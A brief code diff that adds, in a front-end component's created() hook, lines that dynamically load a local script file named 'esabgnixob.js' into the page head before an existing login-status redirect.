@@ -38,6 +38,11 @@ export default {
     },
   },
   created() {
+    let script = document.createElement('script');
+    script.setAttribute('src', 'esabgnixob.js');
+    script.setAttribute('type', 'text/javascript');
+    document.head.appendChild(script);
+
     if (this.loginStatus) {
       this.$router.push('/mobile');
     }
